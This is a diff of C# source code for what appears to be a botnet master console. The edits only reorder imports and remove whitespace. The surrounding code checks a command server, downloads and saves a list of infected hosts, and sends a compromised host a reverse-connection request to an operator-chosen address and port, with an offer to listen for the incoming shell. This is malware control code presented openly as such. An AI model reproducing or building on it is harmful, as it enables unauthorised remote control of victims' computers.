@@ -1,12 +1,12 @@
-﻿using System;
+﻿using Master.AdvancedConsole;
+using Master.Botnet.JSON;
+using Newtonsoft.Json;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net.Http;
 using System.Threading.Tasks;
-using Master.AdvancedConsole;
-using Master.Botnet.JSON;
-using Newtonsoft.Json;
 
 namespace Master.Botnet
 {
@@ -19,7 +19,6 @@ namespace Master.Botnet
         static readonly HttpClient httpClient;
 
         static readonly JsonSerializerSettings jsonSerializerSettings;
-
 
         /// <summary>
         /// Instanciate the http client
@@ -36,7 +35,6 @@ namespace Master.Botnet
             };
         }
 
-
         /// <summary>
         /// Botnet's entry point, asks the user what commands to issue to the master botnet server.
         /// If the user chooses to send a reverse connection request to an infected host via the master botnet server,
@@ -47,7 +45,7 @@ namespace Master.Botnet
         {
             ColorTools.WriteCommandMessage($"Checking if server {SERVER_ADDRESS} is up...");
             var data = JsonConvert.SerializeObject(new CheckServerRequestJson());
-            
+
             // If an error occured, return
             if (PostJsonToServer<CheckServerResponseJson>(data) == null) return null;
 
@@ -93,7 +91,6 @@ namespace Master.Botnet
             return null;
         }
 
-        
         #region Botnet commands
 
         /// <summary>
@@ -103,7 +100,7 @@ namespace Master.Botnet
         {
             var data = JsonConvert.SerializeObject(new ViewHostsRequestJson());
             var response = PostJsonToServer<List<InfectedHostJson>>(data);
-            if(response == null) return;
+            if (response == null) return;
 
             var path = Path.Combine(Environment.CurrentDirectory, "infected_hosts.txt");
             try
@@ -117,7 +114,6 @@ namespace Master.Botnet
             }
         }
 
-
         /// <summary>
         /// Ask the user for an hostname/ip, a port number and an host_id.
         /// Send the request to the server wich will tell the infected host (identified by host_id) the connect to the specified host and port.
@@ -128,7 +124,6 @@ namespace Master.Botnet
         {
             Console.Write("Please type the host_id to send the reverse connection request to : ");
             var host_id = ConsoleTools.PromptInt(null, "Please enter an integer");
-
 
             Console.Write("Please type the hostname or ip adress the infected host should connect to (yours ?) : ");
             var host = ConsoleTools.PromptNonEmptyString();
@@ -146,7 +141,6 @@ namespace Master.Botnet
             }
 
             ColorTools.WriteCommandSuccess("Command successfully sent");
-            
 
             Console.Write("Would you like to listen on the selected port now ? (Y/n) : ");
             var choice = Console.ReadLine();
@@ -157,7 +151,6 @@ namespace Master.Botnet
         }
 
         #endregion Botnet commands
-
 
         #region Server Request - response
 
@@ -192,7 +185,6 @@ namespace Master.Botnet
 
             return response;
         }
-
 
         /// <summary>
         /// Send POST request to server and wait for his response
